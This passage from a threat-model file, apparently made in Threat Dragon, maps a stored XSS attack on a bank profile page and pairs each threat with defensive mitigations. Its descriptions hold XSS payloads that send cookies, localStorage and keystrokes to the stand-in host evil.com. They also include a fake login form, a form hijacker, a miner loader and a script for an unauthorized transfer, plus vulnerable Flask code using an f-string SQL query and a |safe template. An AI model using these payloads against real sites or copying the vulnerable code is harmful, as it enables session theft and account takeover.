              "description": "Database storing user profile information\n   \n   Table: users\n   Columns:\n   - user_id (INTEGER PRIMARY KEY)\n   - username (TEXT)\n   - password_hash (TEXT)\n   - email (TEXT)\n   - bio (TEXT) ← STORES MALICIOUS SCRIPT\n   \n   Example malicious record:\n   {\n     \"user_id\": 42,\n     \"username\": \"attacker123\",\n     \"bio\": \"<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\"\n   }\n   \n   ISSUE: No validation or sanitization before storage",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isALog": false,
              "isEncrypted": false,
              "isSigned": false,
              "storesCredentials": false,
              "storesInventory": false,
              "threats": []
            }
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP POST - Profile Update with XSS Payload",
              "description": "Attacker submits malicious JavaScript in profile bio field\n   \n   REQUEST DETAILS:\n   POST /profile HTTP/1.1\n   Host: bank.example.com\n   Content-Type: application/x-www-form-urlencoded\n   Cookie: session=attacker_session_token\n   \n   bio=<script>alert('XSS')</script>\n   \n   PAYLOADS (various):\n   1. Simple alert: <script>alert('XSS')</script>\n   2. Cookie theft: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n   3. Keylogger: <script>document.onkeypress=function(e){fetch('https://evil.com/log?k='+e.key)}</script>\n   4. Redirect: <script>window.location='https://phishing.com'</script>\n   5. DOM manipulation: <script>document.body.innerHTML='<h1>Hacked!</h1>'</script>\n   \n   The bio field accepts any text input without validation",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "HTTP POST - Profile Update with XSS Payload"
            ],
            "id": "4a9738b2-5218-4a06-8279-54ea2ad99a18",
            "source": {
              "cell": "cb155b1f-0acb-41a4-b548-1a16c1b09573",
              "port": "6212f4fc-f46a-4c41-bdf8-e28f08355796"
            },
            "target": {
              "cell": "b09cca8d-3d9d-440c-b87c-b16a383db8c4",
              "port": "3fbdf71f-ff76-4b28-8835-3cf286ce469a"
            },
            "vertices": [
              {
                "x": 520,
                "y": 180
              },
              {
                "x": 580,
                "y": 220
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Store XSS Payload (No Sanitization)",
              "description": "VULNERABILITY POINT 1\n   \n   Application stores malicious script in database WITHOUT sanitization\n   \n   SQL QUERY:\n   UPDATE users \n   SET bio = '<script>alert('XSS')</script>' \n   WHERE user_id = 42\n   \n   PROBLEM:\n   - No input validation\n   - No HTML encoding\n   - No script tag filtering\n   - No content sanitization\n   - Raw user input stored directly\n   \n   RESULT:\n   Malicious JavaScript is permanently stored in database\n   This is \"Stored XSS\" (most dangerous type)\n   \n   Protocol: SQL\n   Encrypted: NO (internal)",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": [
                {
                  "id": "96fba487-535a-492e-b919-f2d38b4d1213",
                  "title": "Stored XSS - Lack of Input Sanitization on Bio Field",
                  "status": "Open",
                  "severity": "High",
                  "type": "Tampering",
                  "description": "VULNERABILITY:\nThe application stores user-supplied bio field content directly in database without any sanitization, validation, or encoding.\n\nVULNERABLE CODE:\n@app.route('/profile', methods=['POST'])\ndef update_profile():\n    bio = request.form['bio']\n    # DANGEROUS: No sanitization\n    cursor.execute(f\"UPDATE users SET bio='{bio}' WHERE user_id={user_id}\")\n    return redirect('/profile')\n\nATTACK:\nAttacker submits: <script>alert('XSS')</script>\nThis malicious JavaScript is stored in users.bio column as-is.\n\nPERSISTENCE:\nUnlike Reflected XSS, this attack is STORED in database.\nEvery user who views attacker's profile will be attacked.\nAttack persists until database record is manually cleaned.\n\nIMPACT:\n- Permanent XSS payload in database\n- Affects multiple victims\n- Can spread to many users\n- Administrative burden to clean\n\nSTORED XSS is most dangerous type because:\n1. Persistence - remains in database\n2. Wide impact - affects all viewers\n3. Trusted context - appears on legitimate page\n4. No user interaction needed beyond visiting page",
                  "mitigation": "INPUT SANITIZATION (Priority 1):\n\n1. HTML Entity Encoding:\n   from html import escape\n   bio = escape(bio)\n   # Converts < to &lt;, > to &gt;\n   # Script tags become harmless text\n\n2. Sanitization Library:\n   import bleach\n   allowed_tags = ['b', 'i', 'u', 'p', 'br']\n   bio = bleach.clean(bio, tags=allowed_tags, strip=True)\n   # Strips ALL script tags and dangerous HTML\n\n3. Content Validation:\n   import re\n   if re.search(r'<script|javascript:|onerror=', bio, re.IGNORECASE):\n       return \"Invalid content detected\", 400\n\n4. Input Length Limits:\n   MAX_BIO_LENGTH = 500\n   if len(bio) > MAX_BIO_LENGTH:\n       return \"Bio too long\", 400\n\n5. Character Whitelist:\n   allowed_chars = set(string.ascii_letters + string.digits + ' .,!?-')\n   bio = ''.join(c for c in bio if c in allowed_chars)\n\nDATABASE LAYER:\n\n6. Use Parameterized Queries (also prevents SQL injection):\n   cursor.execute(\"UPDATE users SET bio=? WHERE user_id=?\", (bio, user_id))\n\n7. Database Column Constraints:\n   - Add CHECK constraint to reject script tags\n   - Use TEXT type with length limit\n\nAPPLICATION ARCHITECTURE:\n\n8. Separation of Concerns:\n   - Sanitize on input (before storage)\n   - Escape on output (before display)\n   - Double protection\n\n9. Content Security Policy (CSP):\n   Content-Security-Policy: default-src 'self'; script-src 'self'\n   # Blocks inline scripts even if injected\n\n10. Regular Expression Validation:\n    BIO_PATTERN = r'^[a-zA-Z0-9\\s.,!?-]{1,500}$'\n    if not re.match(BIO_PATTERN, bio):\n        return \"Invalid bio format\", 400",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 9,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "tampering": 1,
                "informationDisclosure": 0,
                "denialOfService": 0
              }
            },
            "labels": [
              "Store XSS Payload (No Sanitization)"
            ],
            "id": "a20ba609-a57b-435c-bbb1-5d97de014945",
            "source": {
              "cell": "b09cca8d-3d9d-440c-b87c-b16a383db8c4",
              "port": "77f25a37-cb54-44fa-a3ab-efcb7b31eecc"
            },
            "target": {
              "cell": "0ab333fe-7fc1-4d9c-8119-0b4980110ea0",
              "port": "d804e976-0b48-407a-8754-ee57896ee000"
            },
            "vertices": [
              {
                "x": 1030,
                "y": 290
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP GET - View Attacker's Profile",
              "description": "Victim (admin) requests to view attacker's profile page\n   \n   REQUEST:\n   GET /profile/attacker123 HTTP/1.1\n   Host: bank.example.com\n   Cookie: session=admin_session_token\n   \n   CONTEXT:\n   - Admin reviewing user profiles (routine duty)\n   - Legitimate request\n   - No suspicion of malicious content\n   - Expects normal profile page\n   \n   This triggers the XSS payload to be loaded from database",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "HTTP GET - View Attacker's Profile"
            ],
            "id": "423059a0-d9aa-4e25-aec3-3c0860aa2899",
            "source": {
              "cell": "6497cfd5-26b2-4e30-8ada-2c3912e23804",
              "port": "6212f4fc-f46a-4c41-bdf8-e28f08355796"
            },
            "target": {
              "cell": "b09cca8d-3d9d-440c-b87c-b16a383db8c4",
              "port": "af3d325d-c9d3-4853-9ee4-89d026036626"
            },
            "vertices": [
              {
                "x": 540,
                "y": 410
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Retrieve User Data with XSS Payload",
              "description": "Database returns user record containing stored XSS payload\n   \n   QUERY:\n   SELECT * FROM users WHERE username = 'attacker123'\n   \n   RETURNED DATA:\n   {\n     \"user_id\": 42,\n     \"username\": \"attacker123\",\n     \"email\": \"attacker@example.com\",\n     \"bio\": \"<script>alert('XSS')</script>\"\n   }\n   \n   The malicious script is retrieved as normal data\n   Application has no way to distinguish malicious content from legitimate content",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "Retrieve User Data with XSS Payload"
            ],
            "id": "3a92d28a-737c-4ff3-80d4-14a7c94972be",
            "source": {
              "cell": "0ab333fe-7fc1-4d9c-8119-0b4980110ea0",
              "port": "36e889d3-eb6a-4903-9f95-df14999e436a"
            },
            "target": {
              "cell": "b09cca8d-3d9d-440c-b87c-b16a383db8c4",
              "port": "e5ab90b2-c548-497a-b7b6-cc850580bbbd"
            },
            "vertices": []
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP Response with Unescaped Script",
              "description": "VULNERABILITY POINT 2 \n   \n   Flask renders template with |safe filter, disabling HTML escaping\n   \n   VULNERABLE TEMPLATE CODE:\n   <div class=\"profile-bio\">\n     <h3>About Me:</h3>\n     <p>{{ user.bio|safe }}</p>\n   </div>\n   \n   RENDERED HTML SENT TO VICTIM:\n   <div class=\"profile-bio\">\n     <h3>About Me:</h3>\n     <p><script>alert('XSS')</script></p>\n   </div>\n   \n   PROBLEM:\n   - |safe filter tells Jinja2 to NOT escape HTML\n   - Script tags rendered as-is in HTML\n   - Browser will execute JavaScript\n   - No Content-Security-Policy header\n   - No X-XSS-Protection header\n   \n   STATUS: 200 OK\n   Content-Type: text/html; charset=utf-8\n   \n   This is the critical moment where XSS attack succeeds",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": [
                {
                  "id": "37ae94ae-f116-435b-92a7-0336e206482c",
                  "title": "Stored XSS - Unsafe Template Rendering with |safe Filter",
                  "status": "Open",
                  "severity": "High",
                  "type": "Tampering",
                  "description": "VULNERABILITY:\nThe Jinja2 template uses |safe filter to render user bio, disabling HTML escaping and allowing script execution.\n\nVULNERABLE TEMPLATE CODE:\n<!-- profile.html -->\n<div class=\"profile\">\n  <h2>{{ user.username }}</h2>\n  <p class=\"bio\">{{ user.bio|safe }}</p>  <!-- VULNERABLE -->\n</div>\n\nWHAT |safe DOES:\n- Tells Jinja2 to NOT escape HTML characters\n- Intended for trusted HTML content (admin-generated)\n- Should NEVER be used with user-supplied content\n- Allows script tags to be rendered as executable code\n\nATTACK FLOW:\n1. Database contains: <script>alert('XSS')</script>\n2. Template renders with |safe filter\n3. HTML output: <p class=\"bio\"><script>alert('XSS')</script></p>\n4. Browser parses HTML and executes script\n5. Script runs in victim's browser context\n\nWITHOUT |safe (SAFE VERSION):\n{{ user.bio }}  # Jinja2 auto-escapes\nOutput: &lt;script&gt;alert('XSS')&lt;/script&gt;\nBrowser displays: <script>alert('XSS')</script> (as text)\nNo execution!\n\nWITH |safe (VULNERABLE):\n{{ user.bio|safe }}  # Disables escaping\nOutput: <script>alert('XSS')</script>\nBrowser executes: JavaScript runs!\n\nIMPACT:\n- XSS payload executes in victim's browser\n- Runs with victim's session privileges\n- Can steal cookies, session tokens\n- Can modify page content\n- Can perform actions as victim\n- Can redirect to phishing sites",
                  "mitigation": "OUTPUT ENCODING (Priority 1):\n\n1. Remove |safe Filter:\n   <!-- BEFORE (vulnerable) -->\n   {{ user.bio|safe }}\n   \n   <!-- AFTER (secure) -->\n   {{ user.bio }}\n   \n   Jinja2 auto-escaping will prevent XSS\n\n2. Explicit Escaping:\n   from markupsafe import escape\n   safe_bio = escape(user.bio)\n   return render_template('profile.html', bio=safe_bio)\n\n3. Auto-escape Configuration:\n   app = Flask(__name__)\n   app.jinja_env.autoescape = True  # Enable globally\n\nCONTENT SECURITY POLICY (CSP):\n\n4. Strict CSP Header:\n   response.headers['Content-Security-Policy'] = \\\n       \"default-src 'self'; \" \\\n       \"script-src 'self'; \" \\\n       \"style-src 'self' 'unsafe-inline'; \" \\\n       \"object-src 'none'\"\n   \n   This prevents inline scripts from executing even if injected\n\n5. CSP with Nonce:\n   nonce = secrets.token_urlsafe(16)\n   response.headers['Content-Security-Policy'] = \\\n       f\"script-src 'nonce-{nonce}'\"\n   \n   Only scripts with matching nonce can execute\n\nSECURITY HEADERS:\n\n6. X-XSS-Protection Header:\n   response.headers['X-XSS-Protection'] = '1; mode=block'\n\n7. X-Content-Type-Options:\n   response.headers['X-Content-Type-Options'] = 'nosniff'\n\n8. HTTPOnly Cookies:\n   response.set_cookie('session', value, httponly=True, secure=True)\n   # Prevents JavaScript from accessing cookies\n\nALLOW SAFE HTML (if needed):\n\n9. If you need formatted text:\n   import bleach\n   \n   allowed_tags = ['b', 'i', 'u', 'p', 'br', 'strong', 'em']\n   allowed_attributes = {}\n   \n   clean_bio = bleach.clean(\n       user.bio, \n       tags=allowed_tags,\n       attributes=allowed_attributes,\n       strip=True\n   )\n   \n   return render_template('profile.html', bio=Markup(clean_bio))\n\n10. Markdown Instead of HTML:\n    import markdown\n    \n    # Store as Markdown, not HTML\n    # Render safely:\n    html_bio = markdown.markdown(user.bio, \n                                   extensions=['extra', 'nl2br'])\n    # bleach the output\n    safe_bio = bleach.clean(html_bio, ...)\n    \n    return render_template('profile.html', bio=Markup(safe_bio))\n\nDEFENSE IN DEPTH:\n\n11. Multiple Layers:\n    - Sanitize on input (store clean data)\n    - Escape on output (render safely)\n    - CSP header (block inline scripts)\n    - HTTPOnly cookies (prevent cookie theft)\n    \n    Even if one layer fails, others protect\n\n12. Regular Security Audits:\n    - Search codebase for |safe usage\n    - Review all user-supplied content rendering\n    - Automated scanning with tools like Bandit, semgrep",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 10,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "tampering": 1,
                "informationDisclosure": 0,
                "denialOfService": 0
              }
            },
            "labels": [
              "HTTP Response with Unescaped Script"
            ],
            "id": "b3bb3361-98fd-4226-bf04-a2bf34d4921d",
            "source": {
              "cell": "b09cca8d-3d9d-440c-b87c-b16a383db8c4",
              "port": "af3d325d-c9d3-4853-9ee4-89d026036626"
            },
            "target": {
              "cell": "6497cfd5-26b2-4e30-8ada-2c3912e23804",
              "port": "6212f4fc-f46a-4c41-bdf8-e28f08355796"
            },
            "vertices": [
              {
                "x": 540,
                "y": 330
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Malicious Script Execution",
              "description": "JavaScript executes in victim's browser context with victim's privileges\n   \n   EXECUTION FLOW:\n   1. Browser receives HTML response\n   2. Browser parses HTML\n   3. Browser encounters <script> tag\n   4. Browser executes JavaScript immediately\n   5. Script runs with victim's session cookies\n   6. Script has access to:\n      - document.cookie (session tokens)\n      - localStorage (sensitive data)\n      - DOM (entire page content)\n      - Can make AJAX requests as victim\n      - Can modify page content\n      - Can redirect to phishing sites\n   \n   ATTACK SCENARIOS:\n   \n   A) Cookie Theft:\n   <script>\n     fetch('https://evil.com/steal?cookie=' + document.cookie)\n   </script>\n   \n   B) Session Hijacking:\n   <script>\n     new Image().src = 'https://evil.com/log?session=' + \n                       localStorage.getItem('session_token')\n   </script>\n   \n   C) Keylogging:\n   <script>\n     document.addEventListener('keypress', function(e) {\n       fetch('https://evil.com/keys?k=' + e.key)\n     })\n   </script>\n   \n   D) Phishing:\n   <script>\n     document.body.innerHTML = \n       '<h1>Session Expired</h1>' +\n       '<form action=\"https://evil.com/phish\">' +\n       'Username: <input name=\"user\"><br>' +\n       'Password: <input name=\"pass\" type=\"password\"><br>' +\n       '<button>Login</button></form>'\n   </script>\n   \n   VICTIM IMPACT: Complete account compromise",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": [
                {
                  "id": "e5bc40dd-a45c-403e-b136-d9a42ef72220",
                  "title": "Malicious JavaScript Execution in Victim Browser Context",
                  "status": "Open",
                  "severity": "High",
                  "type": "Information disclosure",
                  "description": "THREAT:\nMalicious JavaScript executes in victim's browser with full access to victim's session and data.\n\nEXECUTION CONTEXT:\n- Script runs as if it were part of legitimate application\n- Has access to all cookies (session tokens)\n- Can read all DOM content\n- Can make AJAX requests as victim\n- Can access localStorage/sessionStorage\n- Same-origin policy doesn't protect (script is on same domain)\n\nATTACK CAPABILITIES:\n\n1. Session Hijacking:\n   <script>\n     fetch('https://evil.com/steal?cookie=' + document.cookie)\n   </script>\n\n2. Credential Theft:\n   <script>\n     // Overlay fake login form\n     document.body.innerHTML = `\n       <div style=\"text-align:center; margin-top:100px\">\n         <h1>Session Expired</h1>\n         <form action=\"https://evil.com/phish\" method=\"POST\">\n           Username: <input name=\"user\"><br>\n           Password: <input type=\"password\" name=\"pass\"><br>\n           <button>Re-login</button>\n         </form>\n       </div>\n     `\n   </script>\n\n3. Keylogging:\n   <script>\n     document.addEventListener('keypress', e => {\n       fetch('https://evil.com/log?key=' + e.key + \n             '&page=' + window.location.href)\n     })\n   </script>\n\n4. Form Hijacking:\n   <script>\n     document.querySelectorAll('form').forEach(form => {\n       form.addEventListener('submit', e => {\n         e.preventDefault()\n         // Send form data to attacker\n         fetch('https://evil.com/harvest', {\n           method: 'POST',\n           body: new FormData(form)\n         })\n       })\n     })\n   </script>\n\n5. Crypto Mining:\n   <script src=\"https://evil.com/coinhive.min.js\"></script>\n   <script>\n     var miner = new CoinHive.Anonymous('attacker-site-key')\n     miner.start()\n   </script>\n\n6. Account Actions:\n   <script>\n     // Transfer money without user knowledge\n     fetch('/transfer', {\n       method: 'POST',\n       headers: {'Content-Type': 'application/json'},\n       body: JSON.stringify({\n         to: 'attacker_account',\n         amount: 10000\n       })\n     })\n   </script>\n\nIMPACT:\n- Complete account compromise\n- Data exfiltration\n- Unauthorized transactions\n- Credential theft\n- Malware distribution\n- Defacement",
                  "mitigation": "BROWSER-SIDE PROTECTIONS:\n\n1. Content Security Policy (CSP):\n   Most effective defense against XSS execution\n   \n   Header: Content-Security-Policy: \n     default-src 'self';\n     script-src 'self';\n     style-src 'self' 'unsafe-inline';\n     img-src 'self' data:;\n     font-src 'self';\n     connect-src 'self';\n     frame-ancestors 'none';\n   \n   This prevents:\n   - Inline scripts from executing\n   - External scripts from loading\n   - Eval() and similar functions\n\n2. CSP with Nonces:\n   Generate random nonce per request:\n   nonce = secrets.token_urlsafe(16)\n   \n   Header: script-src 'nonce-{nonce}'\n   \n   Template: <script nonce=\"{nonce}\">legitCode()</script>\n   \n   Only scripts with matching nonce execute\n\n3. HttpOnly Cookies:\n   Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict\n   \n   Prevents JavaScript from accessing cookies:\n   document.cookie will NOT return HttpOnly cookies\n\n4. SameSite Cookies:\n   SameSite=Strict prevents CSRF and some XSS scenarios\n\n5. Subresource Integrity (SRI):\n   <script src=\"https://cdn.example.com/lib.js\"\n           integrity=\"sha384-abc123...\"\n           crossorigin=\"anonymous\"></script>\n   \n   Ensures loaded scripts haven't been tampered with\n\nAPPLICATION-LEVEL:\n\n6. Re-authentication for Sensitive Actions:\n   Before money transfer, require password re-entry\n   XSS can't steal password not yet entered\n\n7. CSRF Tokens:\n   While primarily for CSRF, also helps against some XSS\n   \n   <form>\n     <input type=\"hidden\" name=\"csrf_token\" value=\"{token}\">\n   </form>\n\n8. Transaction Verification:\n   Send email/SMS for high-value transactions\n   Require out-of-band confirmation\n\nUSER EDUCATION:\n\n9. Security Awareness:\n   - Warn users about suspicious content\n   - Encourage reporting of unusual behavior\n   - Provide \"Report Profile\" feature\n\n10. Browser Extensions:\n    - Recommend NoScript, uBlock Origin\n    - Ad blockers can prevent some XSS delivery",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 12,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "tampering": 0,
                "informationDisclosure": 1,
                "denialOfService": 0
              }
            },
            "labels": [
              "Malicious Script Execution"
            ],
            "id": "e662cd40-589b-467f-bb98-fc5628ed92a5",
            "source": {
              "cell": "6497cfd5-26b2-4e30-8ada-2c3912e23804",
              "port": "3b0008d1-d3c4-4676-afbd-53c792d6eaa6"
            },
            "target": {
              "cell": "6497cfd5-26b2-4e30-8ada-2c3912e23804",
              "port": "1a798fe2-f66c-466f-9a2f-50fc06c86d61"
            },
            "vertices": [
              {
                "x": 228.75,
                "y": 404.99999999999994
              },
              {
                "x": 158.75,
                "y": 354.99999999999994
              },
              {
                "x": 228.75,
                "y": 284.99999999999994
              }
            ],
            "parent": "6497cfd5-26b2-4e30-8ada-2c3912e23804"
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Stolen Session Cookie Exfiltration",
              "description": "Malicious script sends victim's session cookie to attacker's server\n   \n   EXFILTRATION REQUEST:\n   GET /steal?cookie=session=eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ...\n   Host: evil.com\n   \n   ATTACKER RECEIVES:\n   - Victim's session cookie\n   - Victim's username (from cookie)\n   - Victim's role (admin)\n   - Timestamp\n   \n   ATTACKER CAN NOW:\n   1. Use stolen cookie in browser\n   2. Impersonate victim (admin)\n   3. Access all admin functions\n   4. View all customer accounts\n   5. Transfer funds\n   6. Modify system settings\n   7. Create backdoor accounts\n   \n   Protocol: HTTPS (to attacker's server)\n   Data: Sensitive session information",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": [
                {
                  "id": "7a766119-c1ba-480c-a2e4-03e5dbb20807",
                  "title": "Session Cookie Exfiltration via XSS",
                  "status": "Open",
                  "severity": "High",
                  "type": "Information disclosure",
                  "description": "THREAT:\nMalicious script steals victim's session cookie and sends it to attacker-controlled server.\n\nEXFILTRATION PAYLOAD:\n<script>\n  // Method 1: Fetch API\n  fetch('https://evil.com/steal', {\n    method: 'POST',\n    body: JSON.stringify({\n      cookie: document.cookie,\n      url: window.location.href,\n      localStorage: JSON.stringify(localStorage),\n      timestamp: Date.now()\n    })\n  })\n  \n  // Method 2: Image beacon\n  new Image().src = 'https://evil.com/steal?c=' + \n                     encodeURIComponent(document.cookie)\n  \n  // Method 3: Form submission\n  var form = document.createElement('form')\n  form.method = 'POST'\n  form.action = 'https://evil.com/steal'\n  var input = document.createElement('input')\n  input.name = 'data'\n  input.value = document.cookie\n  form.appendChild(input)\n  document.body.appendChild(form)\n  form.submit()\n</script>\n\nSTOLEN DATA:\n- session=eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ...\n- csrf_token=abc123xyz789\n- remember_me=true\n- preferences={\"lang\":\"en\"}\n\nATTACKER RECEIVES:\n1. Session token (most critical)\n2. User ID from cookie\n3. Role/privileges (admin)\n4. CSRF token (allows CSRF attacks)\n5. Current page URL\n6. LocalStorage contents\n7. Timestamp (for session replay)\n\nPOST-EXPLOITATION:\n1. Attacker opens browser\n2. Manually sets stolen cookie:\n   document.cookie = 'session=eyJ1c2Vy...'\n3. Navigates to bank.example.com\n4. Is authenticated as victim (admin)\n5. Has full admin access\n\nIMPACT:\n- Complete account takeover\n- Access to all admin functions\n- Can view/modify all user accounts\n- Can transfer funds\n- Can create backdoor accounts\n- Can exfiltrate entire customer database\n- Can shut down system",
                  "mitigation": "COOKIE PROTECTION:\n\n1. HttpOnly Flag (CRITICAL):\n   Set-Cookie: session=...; HttpOnly\n   \n   When HttpOnly is set:\n   - document.cookie returns empty string or without session cookie\n   - JavaScript CANNOT access the cookie\n   - XSS cannot steal it\n   \n   Implementation:\n   response.set_cookie('session', value, \n                       httponly=True,  # Critical\n                       secure=True,     # HTTPS only\n                       samesite='Strict')  # CSRF protection\n\n2. Secure Flag:\n   Ensures cookie only sent over HTTPS\n   Prevents MITM attacks\n\n3. SameSite Flag:\n   SameSite=Strict: Never sent on cross-site requests\n   SameSite=Lax: Sent on top-level navigation GET\n   \n   Helps prevent CSRF and some XSS scenarios\n\n4. Short Session Timeouts:\n   - Sessions expire after 30 minutes of inactivity\n   - Absolute timeout: 8 hours\n   - Limits window for stolen session use\n\n5. Session Binding:\n   Bind session to:\n   - IP address (careful with mobile users)\n   - User-Agent string\n   - Client TLS certificate\n   \n   If mismatch detected, invalidate session\n\nEXFILTRATION PREVENTION:\n\n6. Content Security Policy (CSP):\n   connect-src 'self'\n   \n   Blocks fetch() to external domains\n   Prevents cookie exfiltration via AJAX\n\n7. Outbound Request Monitoring:\n   - Monitor for suspicious fetch/XHR requests\n   - Alert on requests to unknown domains\n   - Block known malicious IPs\n\nSESSION MANAGEMENT:\n\n8. Token Rotation:\n   - Rotate session token after sensitive actions\n   - Stolen token becomes invalid quickly\n\n9. Multi-Factor Authentication:\n   - Require 2FA for admin accounts\n   - Even with stolen cookie, attacker needs 2FA code\n   - Step-up authentication for sensitive operations\n\n10. Session Invalidation:\n    Provide \"Logout All Sessions\" button\n    Monitor active sessions in user dashboard\n\nDETECTION:\n\n11. Anomaly Detection:\n    - Geographic location changes\n    - Multiple concurrent sessions from different IPs\n    - Sudden spike in admin actions\n    - Unusual time-of-day access\n\n12. Logging:\n    Log all cookie-based authentications:\n    - IP address\n    - User-Agent\n    - Geolocation\n    - Timestamp\n    \n    Alert on suspicious patterns\n\nPREVENTION SUMMARY:\nMost Important: HttpOnly + Secure + SameSite + CSP\nEven if XSS exists, properly configured cookies can't be stolen",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 13,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "tampering": 0,
                "informationDisclosure": 1,
                "denialOfService": 0
              }
            },
            "labels": [
              "Stolen Session Cookie Exfiltration"
            ],
            "id": "51991bbe-75b5-49dd-bab9-bca8833bf414",
            "source": {
              "cell": "6497cfd5-26b2-4e30-8ada-2c3912e23804",
              "port": "1a798fe2-f66c-466f-9a2f-50fc06c86d61"
            },
            "target": {
              "cell": "cb155b1f-0acb-41a4-b548-1a16c1b09573",
              "port": "3b0008d1-d3c4-4676-afbd-53c792d6eaa6"
            },
            "vertices": [
              {
                "x": 366,
                "y": 260
              }
            ]
          },
          {
            "position": {
              "x": 600,
              "y": -180
            },
            "size": {
              "width": 500,
              "height": 310
            },
            "attrs": {
              "text": {
                "text": "STORED CROSS-SITE SCRIPTING (XSS) ATTACK - PROFILE BIO FIELD\n\nATTACK TYPE: Stored XSS (Type 2) - Most Dangerous\nSEVERITY: HIGH | CVSS Score: 8.8\nSTRIDE: Tampering, Information Disclosure\nOWASP Top 10: A03:2021 - Injection\n\nATTACK SUMMARY:\n1. Attacker creates account and submits malicious JavaScript in bio field\n2. Application stores script in database without sanitization\n3. Victim (admin) views attacker's profile\n4. Application renders bio with |safe filter (no escaping)\n5. Victim's browser executes malicious script\n6. Script steals victim's session cookie\n7. Attacker hijacks admin session\n\nAFFECTED COMPONENT: Flask Profile Route (/profile)\nVULNERABLE CODE: {{ user.bio|safe }} in Jinja2 template\nROOT CAUSE: Lack of input sanitization + unsafe output rendering"
              }
            },
            "visible": true,
            "shape": "td-text-block",
            "id": "23daaa3c-c3a7-4c37-b1ff-9db26442e758",
            "zIndex": 11,
            "data": {
              "type": "tm.Text",
